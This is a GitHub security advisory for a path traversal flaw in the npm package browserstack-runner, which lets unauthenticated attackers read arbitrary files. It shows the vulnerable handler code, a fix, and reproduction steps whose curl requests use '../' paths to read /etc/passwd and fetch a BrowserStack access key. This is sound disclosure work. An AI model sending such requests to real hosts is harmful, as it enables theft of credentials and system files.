# [H] browserstack-runner has an unauthenticated arbitrary file read via path traversal in HTTP server

## Summary
Severity: High
Advisory: GHSA-8rpw-6cqh-2v9h
CVE: CVE-2026-49144
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-03
Source: https://github.com/advisories/GHSA-8rpw-6cqh-2v9h
Type: github-advisory

## Affected
- npm: `browserstack-runner` — affected >=0

## Details
## Summary

The HTTP server in browserstack-runner serves files from the project directory via the `_default` handler. This handler uses `path.join(process.cwd(), uri)` to resolve file paths but does not validate that the resulting path stays within the project root. Combined with the server binding on `0.0.0.0` (all interfaces) and the absence of any authentication, this allows an unauthenticated network-adjacent attacker to read arbitrary files from the host filesystem.

## Root Cause

**lib/server.js, lines 530–534 : `_default` handler:**

```javascript
'_default': function defaultHandler(uri, body, request, response) {
    var filePath = path.join(process.cwd(), uri);
    handleFile(filePath, request, response);
}
```

`uri` comes from `url.parse(request.url).pathname` (line 540), which preserves `../` sequences. `path.join` resolves them, producing absolute paths outside the project directory. No boundary check is performed before serving the file.

**bin/cli.js, line 131 : server binding:**

```javascript
server.listen(parseInt(config.test_server_port, 10));
```

No hostname is specified, so Node.js binds on `0.0.0.0` (all interfaces).

**No authentication:** The `_default` handler does not call `getWorkerUuid()` or perform any authentication check.

## Steps to Reproduce

### Step 1 : Start the server (Terminal 1)

```bash
cd browserstack-runner
echo '<html><body>test</body></html>' > _poc_test.html
echo '{"username":"X","key":"X","test_path":"_poc_test.html","test_framework":"qunit","browsers":[]}' > browserstack.json
node bin/runner.js
```

### Step 2 : Read arbitrary files (Terminal 2)

**Read /etc/hostname:**
```bash
curl -s --path-as-is "http://127.0.0.1:8888/../../../etc/hostname"
```

**Read /etc/passwd:**
```bash
curl -s --path-as-is "http://127.0.0.1:8888/../../../etc/passwd"
```

**Read the BrowserStack access key from config:**
```bash
curl -s "http://127.0.0.1:8888/browserstack.json"
```

> **Note:** `--path-as-is` is required because curl normalizes `../` sequences
> by default. Browsers and HTTP libraries that do not normalize URL paths
> (or that allow raw path construction) can exploit this without special flags.

### Expected Result

- `/etc/hostname` → server returns the machine hostname
- `/etc/passwd` → server returns the full passwd file
- `browserstack.json` → server returns the config including the BrowserStack access key

## Impact

- **BrowserStack access key theft** : `browserstack.json` is always in the project root (same directory the server serves from), and contains `username` and `key` in cleartext
- **Source code theft** : all project files are readable
- **System file disclosure** : `/etc/passwd`, `/etc/shadow` (if readable), SSH keys, `.env` files, `.npmrc` (npm tokens), etc.
- **Chainable with Finding #1** : same server, same exposure window, same network-adjacent attacker

## Suggested Fix

1. Validate the resolved path stays within the project root:
```javascript
var filePath = path.resolve(process.cwd(), '.' + uri);
if (!filePath.startsWith(process.cwd() + path.sep)) {
    sendError(response, 'Forbidden', 403);
    return;
}
```
2. Bind on `127.0.0.1`
3. Add authentication to the `_default` handler

## References
- https://github.com/browserstack/browserstack-runner/security/advisories/GHSA-8rpw-6cqh-2v9h
- https://nvd.nist.gov/vuln/detail/CVE-2026-49144
- https://github.com/browserstack/browserstack-runner
- https://www.vulncheck.com/advisories/browserstack-runner-path-traversal-via-default-http-handler
